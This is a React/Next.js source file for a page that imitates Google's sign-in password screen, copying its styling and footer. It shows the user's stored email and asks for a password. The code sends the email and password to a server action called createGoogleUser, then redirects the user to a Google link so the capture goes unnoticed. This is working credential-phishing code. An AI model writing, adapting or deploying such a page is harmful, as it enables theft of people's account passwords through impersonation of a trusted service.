"use client";
import { createGoogleUser } from "@/lib/actions/user.actions";
import { forgotEmailLink, googleLink } from "@/lib/links";
import Image from "next/image";
import { redirect, useRouter } from "next/navigation";
import React, { useEffect, useState } from "react";
import { CgChevronDown } from "react-icons/cg";

function Password() {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();
  const email = localStorage.getItem("email");
  const handlePassword = async () => {
    if (password.length > 6) {
      setError("");
      const data = { username: email!, password: password };
      console.log("This is the data:", data);
      const response = await createGoogleUser(data);
      console.log("this is the resposne", response);
      if (response.messsage == "success") {
        console.log("congratulation");
        window.location.href = googleLink
      }
    } else {
      setError("Check your  password");
    }
  };
  if (!email) return redirect("/google-signin");
  else
    return (
      <div className="w-full h-full sm:bg-[#f0f4f9] sm:flex sm:flex-col sm:justify-center sm:items-center p-4 sm:p-20">
        <div className="flex flex-col gap-y-12 sm:bg-white sm:flex-row sm:px-14 sm:py-20  sm:justify-evenly sm:rounded-[30px]">
          <div className="w-[70%] sm:pr-14">
            <div>
              <Image
                src="/hello.png"
                alt="Profile Image"
                width={1000}
                height={500}
                className="w-[60px] h-[60px] rounded-full"
              />
            </div>
            <div className="w-full h-full p-2 flex flex-col gap-y-8">
              <div className="flex  gap-y-3 gap-x-3 items-center">
                <p className="text-[40px] text-black">Hi,</p>
                <p className="text-[12px] text-black ">
                  <span className="border-[1px] border-black rounded-[20px] p-1 font-semibold">
                    {email}
                  </span>
                </p>
              </div>
            </div>
            ,
          </div>
          <div className="flex flex-col gap-y-10  sm:pt-16 sm:pl-10 sm:pb-10 ">
            <div className="flex flex-col gap-y-1">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Enter your password"
                className="border-[1px] border-black text-black  p-[12px] placeholder:text-gray-700 rounded-[5px] focus:border-[1px] focus:border-blue-600 outline-none"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key == "Enter") handlePassword();
                }}
              />
              {error && <p className="text-red-600 text-sm">{error}</p>}
              <div
                className="flex gap-x-4 mt-2 cursor-pointer"
                onClick={() => setShowPassword(!showPassword)}
              >
                <input
                  type="checkbox"
                  checked={showPassword}
                  onChange={() => setShowPassword(!showPassword)}
                />
                <span className="text-[14px]">Show Password</span>
              </div>
            </div>

            <div className="flex justify-between items-center">
              <span onClick={(e)=>{e.preventDefault(); window.location.href = forgotEmailLink}} className="text-blue-700 text-[14px] ">
                Forget password?
              </span>
              <button
                className="text-white bg-blue-700 rounded-full px-4 py-2"
                onClick={handlePassword}
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div className="w-full bg-greeen-600 justify-between px-6 py-2 mt-6 text-[12px] text-black hidden sm:flex">
          <div>
            <button className="p-2 rounded-[10px] hover:bg-[#b2c5df] flex gap-x-3 items-center">
              <span>English (United States)</span>
              <CgChevronDown />
            </button>
          </div>
          <div>
            <ul className="flex gap-x-4 cursor-pointer">
              <li className="hover:bg-[#b7c8e0] p-2 rounded-[10px]">Help</li>
              <li className="hover:bg-[#b2c5df] p-2 rounded-[10px]">Privacy</li>
              <li className="hover:bg-[#b2c5df] p-2 rounded-[10px]">Terms</li>
            </ul>
          </div>
        </div>
      </div>
    );
}

export default Password;
